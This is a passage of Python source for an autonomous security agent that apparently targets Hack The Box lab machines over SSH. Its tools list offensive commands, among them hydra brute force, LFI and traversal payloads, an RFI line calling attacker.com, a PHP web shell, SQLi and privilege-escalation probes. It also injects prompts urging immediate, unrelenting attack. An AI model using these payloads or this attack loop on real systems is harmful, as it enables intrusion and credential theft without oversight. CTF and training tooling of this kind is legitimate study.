"""
DarkCircuit Agent - The main agent implementation.

This module provides the core agent functionality, leveraging LangChain
and LangGraph to create a sophisticated security-focused assistant
that can execute SSH commands and provide security guidance.
"""

import os
import asyncio
from typing import Dict, Any, Callable, Awaitable, Optional, List

from langchain_openai import ChatOpenAI
from langgraph.graph import StateGraph, START, END
from langchain_core.messages import HumanMessage, SystemMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langchain_community.tools import DuckDuckGoSearchRun

# Import modularized components
from streaming_handler import StreamingHandler

from agent_utils import load_prompts
from Rag_tool import *
from utils import get_path

from dotenv import load_dotenv
load_dotenv(dotenv_path=get_path(".env"))

# Type definitions
MessagesState = dict

class Darkcircuit_Agent:
    """
    The main agent for DarkCircuit security assistant.

    This agent uses LangGraph to implement a reasoning process for security tasks,
    with the ability to execute commands on remote systems and provide analysis.
    """

    def __init__(self,
                 model_name="gpt-4o-mini",
                 reasoning_prompt=None,
                 response_prompt=None,
                 ssh_command_runner: Optional[Callable[[str, int], Awaitable[Dict[str, Any]]]] = None):
        """
        Initialize the agent.

        Args:
            model_name (str): The OpenAI model to use
            reasoning_prompt (str, optional): Custom prompt for the reasoning step
            response_prompt (str, optional): Custom prompt for the response step
            ssh_command_runner (callable, optional): Function to execute SSH commands directly
        """
        # Check for OpenAI API key in environment
        if "OPENAI_API_KEY" not in os.environ:
            raise ValueError("OPENAI_API_KEY environment variable is not set. Please set it before running this script.")

        api_key = os.environ["OPENAI_API_KEY"]

        # Initialize the language model
        self.llm = ChatOpenAI(model=model_name, streaming=True, api_key=api_key)
        self.streaming_handler = None
        self.terminal_command_id = 0

        # Initialize agent tools
        self.ssh_command_runner = ssh_command_runner
        
        # Initialize terminal output queue for frontend communication
        if not self.ssh_command_runner:
            self.terminal_output_queue = asyncio.Queue()
        else:
            self.terminal_output_queue = None

        self.search = DuckDuckGoSearchRun()

        @tool
        def rag_retrieve(query: str) -> str:
            """Search for relevant documents included are writeups from hack the box challenges using RAG"""
            retriever = load_static_rag_context()
            docs = retriever.get_relevant_documents(query)
            content_parts = []
            for i, doc in enumerate(docs):
                metadata = doc.metadata
                content_parts.append(f"[Source {i + 1}] {doc.page_content}")
            return "\n\n".join(content_parts)

        @tool
        def get_htb_techniques(service_or_situation: str = "") -> str:
            """Get immediate HTB exploitation techniques and commands for any service or situation"""
            
            techniques = {
                "ftp": [
                    "ftp <target_ip> → try anonymous:anonymous login",
                    "If anonymous access: download all files with 'mget *'",
                    "Check for writable directories: 'put test.txt' to test uploads",
                    "Look for config files, user files, .bash_history, id_rsa keys",
                    "Try common credentials: admin/admin, ftp/ftp, user/user"
                ],
                "ssh": [
                    "Try common credentials: admin/admin, root/root, user/user, guest/guest",
                    "Try usernames from web/ftp enumeration with passwords: password, 123456, admin",
                    "Check for SSH keys in web directories: wget http://<target_ip>/id_rsa",
                    "Look for .ssh directories in FTP or web access",
                    "Brute force if users found: hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>"
                ],
                "web": [
                    "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js,asp,aspx,jsp",
                    "curl http://<target_ip>/robots.txt && curl http://<target_ip>/.htaccess",
                    "Directory traversal: curl 'http://<target_ip>/index.php?page=../../../etc/passwd'",
                    "LFI payloads: ?file=../../../etc/passwd&cmd=id",
                    "RFI test: ?page=http://attacker.com/shell.txt",
                    "Upload shell: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
                    "SQLi: ' OR 1=1-- -",
                    "Common paths: /admin /login /config /backup /uploads /shell /webshell",
                    "CMS attacks: /wp-admin /administrator /admin.php /login.php",
                    "Database access: /phpmyadmin /adminer /mysql /db"
                ],
                "smb": [
                    "smbclient -L <target_ip> → list shares (try null session)",
                    "smbclient //<target_ip>/share → connect to shares",
                    "enum4linux <target_ip> → enumerate users/groups/shares",
                    "Try guest access: smbclient //<target_ip>/share -U guest",
                    "Download everything: smbget -R smb://<target_ip>/share",
                    "Look for sensitive files: passwords.txt, config files, scripts"
                ],
                "flags": [
                    "find / -name 'user.txt' 2>/dev/null | head -5",
                    "find / -name 'root.txt' 2>/dev/null | head -5",
                    "find / -name '*flag*' 2>/dev/null | head -10",
                    "cat /root/root.txt 2>/dev/null || echo 'Need root access'",
                    "find /home -name 'user.txt' 2>/dev/null | xargs cat 2>/dev/null",
                    "find /var/www -name '*flag*' -o -name '*user*' -o -name '*root*' 2>/dev/null",
                    "grep -r 'HTB{' /var/www/ 2>/dev/null | head -5",
                    "find /opt -name '*flag*' 2>/dev/null"
                ],
                "privilege_escalation": [
                    "sudo -l → check sudo permissions (try GTFOBins)",
                    "find / -perm -4000 2>/dev/null → SUID binaries (check GTFOBins)",
                    "cat /etc/crontab && ls -la /etc/cron* → cron job hijacking",
                    "ps aux | grep root → root processes to exploit",
                    "netstat -tulpn | grep :127 → internal services",
                    "find / -writable 2>/dev/null | grep -E '(etc|bin|sbin)' | head -5",
                    "getcap -r / 2>/dev/null | grep -v 'getcap'",
                    "ls -la /opt /srv /usr/local/bin → custom binaries",
                    "cat ~/.bash_history /root/.bash_history 2>/dev/null",
                    "find / -name '*.py' -perm -u+x 2>/dev/null | head -5 → Python scripts",
                    "systemctl list-timers → systemd timers",
                    "find /var/log -readable 2>/dev/null | head -5 → log poisoning"
                ],
                "reconnaissance": [
                    "nmap -p- --min-rate 10000 <target_ip>",
                    "nmap -sV -sC -p <ports> <target_ip>",
                    "nmap -sU --top-ports 100 <target_ip> (UDP scan)",
                    "whatweb <target_ip> (web technology detection)",
                    "nmap --script vuln -p <ports> <target_ip> (vulnerability scan)"
                ],
                "enumeration": [
                    "ls -la → check current directory permissions",
                    "whoami → current user",
                    "id → current user privileges",
                    "uname -a → system information",
                    "cat /etc/os-release → OS version",
                    "ps aux → running processes",
                    "netstat -tulpn → network connections",
                    "mount → mounted filesystems"
                ]
            }
            
            # Match service or situation
            service_lower = service_or_situation.lower()
            matched_techniques = []
            
            for category, commands in techniques.items():
                if category in service_lower or any(keyword in service_lower for keyword in category.split()):
                    matched_techniques.extend([f"🔥 {category.upper()}: {cmd}" for cmd in commands])
            
            # If no specific match, provide aggressive starting techniques
            if not matched_techniques:
                matched_techniques = [
                    "🚀 AGGRESSIVE START - EXECUTE ALL IMMEDIATELY:",
                    "• nmap -p- --min-rate 10000 <target_ip>",
                    "• nmap -sV -sC -p <discovered_ports> <target_ip>",
                    "• gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html",
                    "• ftp <target_ip> (try anonymous login)",
                    "• smbclient -L <target_ip>",
                    "• find / -name 'user.txt' 2>/dev/null",
                    "• find / -name 'root.txt' 2>/dev/null",
                    "• Try common web paths: /admin /login /config /backup"
                ]
            
            # Always add flag hunting section
            matched_techniques.extend([
                "",
                "🏁 IMMEDIATE FLAG HUNTING - RUN ALL:",
                "• find / -name 'user.txt' 2>/dev/null | xargs cat 2>/dev/null",
                "• find / -name 'root.txt' 2>/dev/null | xargs cat 2>/dev/null", 
                "• find / -name '*flag*' 2>/dev/null | head -10",
                "• find /var/www /home /opt -name '*flag*' -o -name '*user*' -o -name '*root*' 2>/dev/null",
                "• grep -r 'HTB{' /var/www/ /home/ 2>/dev/null | head -5",
                "",
                "🎯 PERSISTENCE STRATEGY:",
                "• Keep trying different attack vectors simultaneously",
                "• If one service blocked, immediately pivot to others",
                "• Always check for flags after each successful step",
                "• Don't stop until both user.txt and root.txt are found"
            ])
            
            return "\n".join(matched_techniques)

        @tool
        async def auto_enumerate(self, target_ip: str) -> str:
            """Automatically perform aggressive enumeration on target IP - runs multiple scans in parallel"""
            
            commands_to_run = [
                f"nmap -p- --min-rate 10000 {target_ip}",
                f"ftp {target_ip} <<< 'anonymous\nanonymous\nls\nquit'",
                f"smbclient -L {target_ip} -N",
                f"curl -s http://{target_ip}/robots.txt",
                f"curl -s http://{target_ip} | grep -i 'login\\|admin\\|config'",
                "find / -name 'user.txt' 2>/dev/null | head -3",
                "find / -name 'root.txt' 2>/dev/null | head -3"
            ]
            
            results = []
            for cmd in commands_to_run:
                try:
                    # Execute each enumeration command
                    result = await self.run_command.ainvoke(cmd)
                    results.append(f"[CMD: {cmd}]\n{result}\n")
                except Exception as e:
                    results.append(f"[CMD: {cmd}]\nError: {str(e)}\n")
            
            combined_results = "\n".join(results)
            return f"🔍 AGGRESSIVE AUTO-ENUMERATION RESULTS:\n\n{combined_results}\n\n🎯 NEXT: Analyze results and immediately exploit discovered services!"

        @tool
        async def hunt_flags(self) -> str:
            """Aggressively hunt for flags in common locations"""
            
            flag_commands = [
                "find / -name 'user.txt' 2>/dev/null | xargs cat 2>/dev/null",
                "find / -name 'root.txt' 2>/dev/null | xargs cat 2>/dev/null", 
                "find / -name '*flag*' 2>/dev/null | head -10",
                "find /var/www -name '*flag*' -o -name '*user*' -o -name '*root*' 2>/dev/null",
                "find /home -name '*flag*' -o -name 'user.txt' 2>/dev/null | xargs cat 2>/dev/null",
                "grep -r 'HTB{' /var/www/ /home/ /opt/ 2>/dev/null | head -5",
                "find /opt /srv /tmp -name '*flag*' -o -name '*user*' -o -name '*root*' 2>/dev/null"
            ]
            
            results = []
            flags_found = []
            
            for cmd in flag_commands:
                try:
                    result = await self.run_command.ainvoke(cmd)
                    results.append(f"[{cmd}]\n{result}\n")
                    
                    # Check if we found actual flags
                    if 'HTB{' in result or ('.txt' in result and len(result.strip()) > 0 and 'No such file' not in result):
                        flags_found.append(result.strip())
                        
                except Exception as e:
                    results.append(f"[{cmd}]\nError: {str(e)}\n")
            
            combined_results = "\n".join(results)
            
            if flags_found:
                flag_summary = "\n".join(flags_found)
                return f"🏆 FLAG HUNTING RESULTS - FLAGS FOUND! 🏆\n\n{flag_summary}\n\nFull Results:\n{combined_results}"
            else:
                return f"🔍 FLAG HUNTING RESULTS - No flags found yet, keep exploiting!\n\n{combined_results}\n\n💡 TIP: Try different privilege escalation techniques!"

        @tool
        async def smart_ftp_enum(self, target_ip: str) -> str:
            """Smart FTP enumeration that avoids interactive sessions"""
            try:
                # Use automated FTP commands to avoid getting stuck
                result = await self.run_command.ainvoke(f"echo -e 'anonymous\\nanonymous\\nls -la\\npwd\\nquit' | ftp -n {target_ip}")
                return f"🔍 SMART FTP ENUMERATION:\n{result}"
            except Exception as e:
                return f"FTP enumeration failed: {str(e)}"

        @tool
        async def run_command(command: str) -> str:
            """Execute a command on the remote SSH server (HTB Pwnbox environment)."""
            from agent_utils import optimize_command, wait_for_terminal_output

            try:
                # Generate a unique ID for this command execution
                self.terminal_command_id += 1
                command_id = self.terminal_command_id

                # Use smart command optimization with shell context awareness
                optimized_command, optimization_message = self.smart_command_optimization(command)
                
                # Add context reminder and flag detection for all commands
                context_reminder = "\n[CONTEXT: You are on HTB Pwnbox executing commands against the target machine]"
                
                # Add flag hunting suggestion based on command type
                flag_hunting_hint = ""
                if any(cmd in optimized_command.lower() for cmd in ['ls', 'cat', 'find', 'grep', 'cd']):
                    flag_hunting_hint = "\n[HINT: After exploring, run: find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null | xargs cat 2>/dev/null]"
                elif any(cmd in optimized_command.lower() for cmd in ['wget', 'curl', 'ftp', 'smbclient']):
                    flag_hunting_hint = "\n[HINT: After downloading files, check them for flags or credentials]"
                elif 'nmap' in optimized_command.lower():
                    flag_hunting_hint = "\n[HINT: After port scan, immediately test each service found]"

                # If we have a direct SSH command runner, use it
                if self.ssh_command_runner:
                    print(f"Executing command directly on SSH: {optimized_command} (ID: {command_id})")

                    # Still notify the frontend about the command for display purposes
                    if self.streaming_handler:
                        await self.streaming_handler.queue.put({
                            "type": "ui_terminal_command",
                            "command": optimized_command,
                            "command_id": command_id
                        })

                    # Execute the command directly using the provided function
                    result = await self.ssh_command_runner(optimized_command)

                    # Extract the output
                    if result and "success" in result:
                        output = result.get("output", "")

                        # Add optimization message if present
                        if optimization_message:
                            output = f"Note: {optimization_message}\n\n{output}"

                        # Add context reminder and flag hunting hints
                        output += context_reminder + flag_hunting_hint
                        
                        # Add intelligent analysis prompts based on output
                        analysis_prompt = self.analyze_command_output(optimized_command, output)
                        if analysis_prompt:
                            output += analysis_prompt
                        
                        # Auto-detect potential flags in output
                        if 'HTB{' in output or 'user.txt' in output or 'root.txt' in output:
                            output += "\n\n🏆 POTENTIAL FLAG DETECTED IN OUTPUT! 🏆\n"

                        # Track command in learning system if available
                        if hasattr(self, 'learning_system') and self.learning_system:
                            try:
                                self.learning_system.track_command(optimized_command, output)
                                print(f"[Learning] Tracked command: {optimized_command[:50]}...")
                            except Exception as e:
                                print(f"[Learning] Error tracking command: {e}")

                        return output
                    else:
                        failure_msg = "Command execution failed or returned no results."
                        
                        # Track failed command in learning system if available
                        if hasattr(self, 'learning_system') and self.learning_system:
                            try:
                                self.learning_system.track_command(optimized_command, failure_msg, success=False)
                                print(f"[Learning] Tracked failed command: {optimized_command[:50]}...")
                            except Exception as e:
                                print(f"[Learning] Error tracking failed command: {e}")
                        
                        return failure_msg
                else:
                    # Fallback to the old method using the frontend
                    print(f"No direct SSH runner available, using frontend for command: {optimized_command} (ID: {command_id})")

                    # Tell the frontend to execute the command
                    if self.streaming_handler:
                        await self.streaming_handler.queue.put({
                            "type": "ui_terminal_command",
                            "command": optimized_command,
                            "command_id": command_id
                        })

                    # Wait for output from the frontend
                    if self.terminal_output_queue:
                        output = await wait_for_terminal_output(self.terminal_output_queue, command_id)
                        
                        # Add optimization message if present
                        if optimization_message:
                            output = f"Note: {optimization_message}\n\n{output}"

                        # Add context reminder and flag hunting hints
                        output += context_reminder + flag_hunting_hint
                        
                        # Add intelligent analysis prompts based on output
                        analysis_prompt = self.analyze_command_output(optimized_command, output)
                        if analysis_prompt:
                            output += analysis_prompt
                        
                        # Auto-detect potential flags in output
                        if 'HTB{' in output or 'user.txt' in output or 'root.txt' in output:
                            output += "\n\n🏆 POTENTIAL FLAG DETECTED IN OUTPUT! 🏆\n"
                        
                        # Track command in learning system if available
                        if hasattr(self, 'learning_system') and self.learning_system and output:
                            try:
                                self.learning_system.track_command(optimized_command, output)
                                print(f"[Learning] Tracked frontend command: {optimized_command[:50]}...")
                            except Exception as e:
                                print(f"[Learning] Error tracking frontend command: {e}")
                        
                        return output
                    else:
                        return "Terminal output queue not initialized."

            except Exception as e:
                return f"Error executing command: {str(e)}"

        # Add smart methods for shell context awareness
        self.smart_command_optimization = self.smart_command_optimization
        self.get_context_aware_hint = self.get_context_aware_hint
        
        self.run_command = run_command
        self.rag_retrieve = rag_retrieve
        self.get_htb_techniques = get_htb_techniques
        self.auto_enumerate = auto_enumerate
        self.hunt_flags = hunt_flags
        self.smart_ftp_enum = smart_ftp_enum
        self.tools = [self.search, self.run_command, self.rag_retrieve, self.get_htb_techniques, self.auto_enumerate, self.hunt_flags, self.smart_ftp_enum]
        self.llm_with_tools = self.llm.bind_tools(self.tools)

        # Load default prompts from file or use hardcoded defaults
        DEFAULT_REASONING_PROMPT, DEFAULT_RESPONSE_PROMPT = load_prompts()

        # Create system messages
        self.reasoning_prompt = SystemMessage(content=reasoning_prompt or DEFAULT_REASONING_PROMPT)
        self.response_prompt = SystemMessage(content=response_prompt or DEFAULT_RESPONSE_PROMPT)
        
        # Preload RAG system during agent initialization for faster response times
        print("🔄 Initializing RAG system for instant responses...")
        from Rag_tool import preload_rag_system
        preload_rag_system()

    def smart_command_optimization(self, command: str):
        """Optimize commands with shell context awareness"""
        from agent_utils import optimize_command
        
        # Basic optimization first
        optimized_command, optimization_message = optimize_command(command)
        
        # FTP session detection and automation
        if 'ftp ' in command.lower() and not any(flag in command for flag in ['-n', '<<<', 'curl', 'wget']):
            # This looks like an interactive FTP command - automate it
            target = command.split()[-1] if command.split() else 'target_ip'
            optimized_command = f"echo 'anonymous\\nanonymous\\nls -la\\npwd\\nquit' | ftp -n {target}"
            optimization_message = "🚨 AUTOMATED FTP SESSION - avoids getting stuck in interactive mode"
            
        # SMB session detection
        elif 'smbclient ' in command.lower() and '//' in command:
            if '-N' not in command and '-U' not in command:
                optimized_command = command + " -N"
                optimization_message = "Added -N flag for null session"
                
        return optimized_command, optimization_message

    def get_context_aware_hint(self, command: str):
        """Provide context-aware hints based on command and current shell"""
        
        # FTP context detection and guidance
        if any(ftp_cmd in command.lower() for ftp_cmd in ['ftp', 'anonymous']):
            return "[FTP CONTEXT: If files found, EXIT and use 'wget ftp://anonymous:anonymous@target/filename' to download and analyze]"
        
        # SMB context
        if any(smb_cmd in command.lower() for smb_cmd in ['smbclient', 'enum4linux']):
            return "[SMB CONTEXT: Download files with 'get', then EXIT to analyze locally. Don't get stuck in SMB shell!]"
            
        # Web context
        if any(web_cmd in command.lower() for web_cmd in ['gobuster', 'curl', 'wget']):
            return "[WEB CONTEXT: Test found directories for LFI, upload, SQLi immediately]"
            
        # File operations
        if any(cmd in command.lower() for cmd in ['ls', 'cat', 'find', 'grep']):
            return "[FILE CONTEXT: Priority order: 1) Flags 2) SSH keys 3) Passwords 4) Config files]"
            
        return "[CONTEXT: Always prioritize flag hunting after any successful access]"

    def analyze_command_output(self, command: str, output: str):
        """Analyze command output and provide intelligent next steps"""
        
        if not output or len(output.strip()) < 5:
            return "\n\n🤔 EMPTY OUTPUT - Command may have failed or needs different approach"
        
        # Analyze nmap results
        if 'nmap' in command.lower():
            open_ports = []
            lines = output.split('\n')
            for line in lines:
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    service = line.split()[-1] if len(line.split()) > 2 else 'unknown'
                    open_ports.append(f"{port}({service})")
            
            if open_ports:
                next_steps = "\n\n🎯 NMAP ANALYSIS - IMMEDIATE ACTIONS REQUIRED:\n"
                for port_service in open_ports[:5]:  # Show first 5 ports
                    port = port_service.split('(')[0]
                    service = port_service.split('(')[1].replace(')', '') if '(' in port_service else 'unknown'
                    
                    if '21' in port or 'ftp' in service.lower():
                        next_steps += f"• Port {port} (FTP): run_command('echo \"anonymous\\nanonymous\\nls\\nquit\" | ftp -n <target_ip>')\n"
                    elif '22' in port or 'ssh' in service.lower():
                        next_steps += f"• Port {port} (SSH): Try common creds or look for SSH keys in other services\n"
                    elif '80' in port or 'http' in service.lower():
                        next_steps += f"• Port {port} (Web): run_command('gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt')\n"
                    elif '443' in port or 'https' in service.lower():
                        next_steps += f"• Port {port} (HTTPS): run_command('gobuster dir -u https://<target_ip> -w /usr/share/wordlists/dirb/common.txt')\n"
                    elif '139' in port or '445' in port or 'smb' in service.lower():
                        next_steps += f"• Port {port} (SMB): run_command('smbclient -L <target_ip> -N')\n"
                        
                next_steps += "\n🚨 EXECUTE ALL IMMEDIATELY - DON'T ANALYZE, JUST ATTACK!"
                return next_steps
            else:
                return "\n\n❌ NO OPEN PORTS FOUND - Try UDP scan: nmap -sU --top-ports 100 <target_ip>"
        
        # Analyze FTP results
        elif 'ftp' in command.lower() or 'anonymous' in output.lower():
            if 'Login successful' in output or '230' in output or 'ftp>' in output:
                files = []
                lines = output.split('\n')
                for line in lines:
                    if any(ext in line.lower() for ext in ['.txt', '.conf', '.key', '.sql', '.php', '.sh']):
                        filename = line.split()[-1] if line.split() else ''
                        if filename and not filename.startswith('.'):
                            files.append(filename)
                
                if files:
                    next_steps = "\n\n📁 FTP FILES DETECTED - DOWNLOAD NOW:\n"
                    for file in files[:5]:
                        next_steps += f"• run_command('wget ftp://anonymous:anonymous@<target_ip>/{file}')\n"
                    next_steps += "• Then: run_command('cat {downloaded_file} | grep -i password\\|key\\|flag\\|htb')\n"
                    return next_steps
                else:
                    return "\n\n🔍 FTP ACCESS SUCCESSFUL - Try: run_command('echo \"anonymous\\nanonymous\\nls -la\\npwd\\nquit\" | ftp -n <target_ip>')"
            elif 'Connection refused' in output or 'No route to host' in output:
                return "\n\n❌ FTP CONNECTION FAILED - Service might be down or filtered"
            elif 'Login incorrect' in output or '530' in output:
                return "\n\n🔒 ANONYMOUS FTP DENIED - Try brute force: hydra -L users.txt -P passwords.txt ftp://<target_ip>"
        
        # Analyze web enumeration results
        elif 'gobuster' in command.lower() or 'dirb' in command.lower():
            found_dirs = []
            lines = output.split('\n')
            for line in lines:
                if '200' in line or 'Status: 200' in line:
                    # Extract directory from gobuster output
                    parts = line.split()
                    for part in parts:
                        if part.startswith('/') and len(part) > 1:
                            found_dirs.append(part)
            
            if found_dirs:
                next_steps = "\n\n🌐 WEB DIRECTORIES FOUND - EXPLOIT NOW:\n"
                for dir_path in found_dirs[:5]:
                    next_steps += f"• run_command('curl http://<target_ip>{dir_path}/ | grep -i login\\|admin\\|config\\|password')\n"
                    if 'admin' in dir_path.lower():
                        next_steps += f"• run_command('curl http://<target_ip>{dir_path}/ | grep -i form\\|input')\n"
                next_steps += "• Try LFI: run_command('curl \"http://<target_ip>/page?file=../../../etc/passwd\"')\n"
                return next_steps
            else:
                return "\n\n🔍 NO WEB DIRECTORIES - Try different wordlist or check robots.txt"
        
        # Analyze SMB results
        elif 'smbclient' in command.lower() or 'enum4linux' in command.lower():
            if 'Sharename' in output or 'ADMIN$' in output:
                shares = []
                lines = output.split('\n')
                for line in lines:
                    if 'Disk' in line and '$' not in line:  # Look for non-admin shares
                        share_name = line.split()[0] if line.split() else ''
                        if share_name:
                            shares.append(share_name)
                
                if shares:
                    next_steps = "\n\n📂 SMB SHARES FOUND - ACCESS NOW:\n"
                    for share in shares[:3]:
                        next_steps += f"• run_command('smbclient //<target_ip>/{share} -N')\n"
                    return next_steps
                else:
                    return "\n\n🔒 ONLY ADMIN SHARES - Try with credentials or null session"
            else:
                return "\n\n❌ SMB ACCESS DENIED - Try different authentication"
        
        # Analyze file content results
        elif any(cmd in command.lower() for cmd in ['cat', 'grep', 'find']):
            if 'HTB{' in output:
                return "\n\n🏆 FLAG FOUND! MISSION ACCOMPLISHED! 🏆"
            elif 'user.txt' in output or 'root.txt' in output:
                return "\n\n🎯 FLAG FILE FOUND - READ IT: run_command('cat {flag_file_path}')"
            elif 'password' in output.lower() or 'pass' in output.lower():
                return "\n\n🔑 PASSWORDS DETECTED - Use for SSH/FTP/SMB access"
            elif 'id_rsa' in output or 'ssh' in output.lower():
                return "\n\n🗝️ SSH KEYS DETECTED - Download and use for SSH access"
            elif output.strip() and 'No such file' not in output:
                return "\n\n📋 FILES/CONTENT FOUND - Analyze for creds, configs, or escalation paths"
        
        # Generic analysis for other commands
        elif output.strip():
            if 'Permission denied' in output:
                return "\n\n🚫 PERMISSION DENIED - Try privilege escalation or different approach"
            elif 'command not found' in output.lower():
                return "\n\n❌ COMMAND NOT FOUND - Try alternative commands or check if binary exists"
            elif len(output.strip()) > 50:
                return "\n\n✅ COMMAND SUCCESSFUL - Analyze output and plan next attack vector"
        
        return "\n\n🤖 OUTPUT RECEIVED - Continue with systematic enumeration"

    def _build_agent_graph(self):
        """Set up the LangGraph for agent reasoning."""
        builder = StateGraph(MessagesState)

        # Add nodes
        builder.add_node("reasoner", self.reasoner)
        builder.add_node("tools", self.tools_node)
        builder.add_node("responder", self.responder)

        # Add edges
        builder.add_edge(START, "reasoner")
        builder.add_conditional_edges("reasoner", self.route_from_reasoner)
        builder.add_edge("tools", "reasoner")
        builder.add_edge("responder", END)

        # Compile the graph
        self.react_graph = builder.compile()

    async def receive_terminal_output(self, output_data):
        """
        Receive terminal output from the frontend.

        Args:
            output_data (dict): Output data from the terminal
        """
        # Find the run_command tool and pass the output to its queue
        for tool in self.tools:
            if hasattr(tool, 'name') and tool.name == 'run_command':
                if hasattr(tool, 'terminal_output_queue'):
                    await tool.terminal_output_queue.put(output_data)
                break

    async def reasoner(self, state: MessagesState):
        """
        Agent reasoning node - determines what actions to take.

        Args:
            state (dict): Current state of the conversation

        Returns:
            dict: Updated state with reasoning results
        """
        print("[Agent] Entering reasoner node with message count:", len(state["messages"]))

        # Use debug output target for reasoner
        self.streaming_handler.output_target = "debug"

        try:
            # When preparing messages for the reasoner, include the original user query
            # and system messages, but convert tool messages to system messages
            filtered_messages = []
            has_htb_request = False
            
            for msg in state["messages"]:
                if isinstance(msg, (HumanMessage, SystemMessage)):
                    filtered_messages.append(msg)
                    # Check if this is an HTB challenge request
                    if isinstance(msg, HumanMessage) and any(keyword in msg.content.lower() for keyword in ['htb', 'hack the box', 'target', 'machine', 'challenge', 'dancing', 'meow', 'fawn', 'explosion']):
                        has_htb_request = True
                elif isinstance(msg, ToolMessage):
                    # Convert tool messages to system messages to preserve their content
                    tool_name = getattr(msg, "name", "tool")
                    tool_content = getattr(msg, "content", "")
                    system_msg = SystemMessage(content=f"Tool result from {tool_name}: {tool_content}")
                    filtered_messages.append(system_msg)
                elif getattr(msg, "type", "") in ["human", "system"]:
                    filtered_messages.append(msg)
                    if getattr(msg, "type", "") == "human" and any(keyword in msg.content.lower() for keyword in ['htb', 'hack the box', 'target', 'machine', 'challenge', 'dancing', 'meow', 'fawn', 'explosion']):
                        has_htb_request = True
                elif getattr(msg, "type", "") == "tool":
                    tool_name = getattr(msg, "name", "tool")
                    tool_content = getattr(msg, "content", "")
                    system_msg = SystemMessage(content=f"Tool result from {tool_name}: {tool_content}")
                    filtered_messages.append(system_msg)
            
            # If this looks like an HTB challenge, inject aggressive action guidance
            if has_htb_request:
                if len(state["messages"]) < 5:
                    # Initial aggressive push
                    action_boost = SystemMessage(content="🚨 IMMEDIATE ACTION REQUIRED: This is an HTB challenge. Start MULTIPLE reconnaissance approaches NOW - don't overthink, execute in parallel: 1) nmap -p- --min-rate 10000 <target_ip> 2) If web services found, immediately run gobuster 3) Try FTP anonymous login 4) Check SMB shares 5) Hunt for flags constantly")
                    filtered_messages.append(action_boost)
                elif len(state["messages"]) < 15:
                    # Mid-challenge persistence boost
                    persistence_boost = SystemMessage(content="🔄 PERSISTENCE MODE: You should be aggressively trying multiple attack vectors. If stuck on one service, immediately pivot to others. ALWAYS check for flags after any successful access. Keep the pressure up!")
                    filtered_messages.append(persistence_boost)
                
                # Always add flag hunting reminder
                flag_reminder = SystemMessage(content="FLAG HUNTING: After EVERY successful command, immediately run: find / -name 'user.txt' 2>/dev/null | xargs cat 2>/dev/null && find / -name 'root.txt' 2>/dev/null | xargs cat 2>/dev/null")
                filtered_messages.append(flag_reminder)

            # If no messages after filtering, check for the original human message
            if not filtered_messages:
                for msg in state["messages"]:
                    if isinstance(msg, HumanMessage) or getattr(msg, "type", "") == "human":
                        filtered_messages.append(msg)
                        break

            # Add the system prompt
            messages_to_send = [self.reasoning_prompt] + filtered_messages

            # Log what we're sending
            print(f"[Agent] Reasoner sending {len(messages_to_send)} messages")
            for i, msg in enumerate(messages_to_send):
                content = getattr(msg, "content", "")
                print(f"[Agent] Message {i}: {type(msg).__name__} - {content[:50]}...")

            # Only invoke once with a timeout
            result = await asyncio.wait_for(
                self.llm_with_tools.ainvoke(
                    messages_to_send,
                    config={"callbacks": [self.streaming_handler]}
                ),
                timeout=60  # Add a timeout to prevent hanging
            )

            # Extract and log the content
            result_text = getattr(result, "content", "").strip().lower()
            print(f"[Agent] Reasoner result preview: {result_text[:100]}...")

            # Enhanced logic - only done if we found flags or exhausted all options
            found_flags = "htb{" in result_text or "user.txt" in result_text or "root.txt" in result_text
            ready_phrase = "[ready to answer]" in result_text
            
            # Be more aggressive - only stop if we explicitly found flags or said we're ready
            done = ready_phrase and (found_flags or "exhausted" in result_text or "no more" in result_text)
            
            # If we haven't found flags and it's been less than 20 messages, keep going
            if not found_flags and len(state["messages"]) < 20:
                done = False
                
            print(f"[Agent] Done status: {done}, Found flags: {found_flags}, Messages: {len(state['messages'])}")
            
            # Update the state with filtered messages and the result
            new_messages = filtered_messages + [result]

            # Flush the thinking buffer to send consolidated thinking content
            await self.streaming_handler._flush_thinking_buffer(done)

            return {**state, "messages": new_messages, "done": done}

        except Exception as e:
            print(f"[Agent] Error in reasoner: {str(e)}")
            # Handle error and still return something valid

            # Flush any buffered thinking content before sending the error
            await self.streaming_handler._flush_thinking_buffer()

            await self.streaming_handler.queue.put({
                "type": "thinking",
                "value": f"Error in reasoning: {str(e)}"
            })

            # Return original messages to avoid corrupting state
            return {**state, "messages": state["messages"], "done": True}  # Force done to exit on error

    async def tools_node(self, state: MessagesState):
        """
        Execute tool calls from the reasoner.

        Args:
            state (dict): Current state with tool calls

        Returns:
            dict: Updated state with tool results
        """
        print("[Agent] Entering tools node")

        # Get the last message which should contain the tool calls
        last_message = state["messages"][-1] if state["messages"] else None

        # Extract tool calls from the message
        tool_calls = []
        if hasattr(last_message, "tool_calls") and last_message.tool_calls:
            tool_calls = last_message.tool_calls

        # Process each tool call sequentially instead of using ToolNode
        preserved_messages = list(state["messages"])

        # Process tool calls one at a time
        for tool_call in tool_calls:
            tool_name = tool_call.get('name', 'unknown_tool')
            tool_args = tool_call.get('args', {})

            print(f"[Agent] Processing tool call: {tool_name} with args: {tool_args}")

            # Find the matching tool
            matching_tool = None
            for tool in self.tools:
                if hasattr(tool, 'name') and tool.name == tool_name:
                    matching_tool = tool
                    break

            if matching_tool:
                try:
                    # Execute the tool with appropriate arguments
                    if tool_name == "run_command":
                        # Extract command string from arguments
                        command = ""
                        if isinstance(tool_args, dict):
                            if 'command' in tool_args:
                                command = tool_args['command']
                            # Some models may use 'input' instead of 'command'
                            elif 'input' in tool_args:
                                command = tool_args['input']
                            # Handle case where the tool_args might be incorrectly formatted
                            elif len(tool_args) == 1 and 'self' in tool_args:
                                # Try to extract command from the 'self' field if it's a string
                                if isinstance(tool_args['self'], str):
                                    command = tool_args['self']
                                else:
                                    raise ValueError("Invalid command format in tool arguments")
                        elif isinstance(tool_args, str):
                            command = tool_args
                        else:
                            command = str(tool_args)

                        print(f"[Agent] Executing command: {command}")

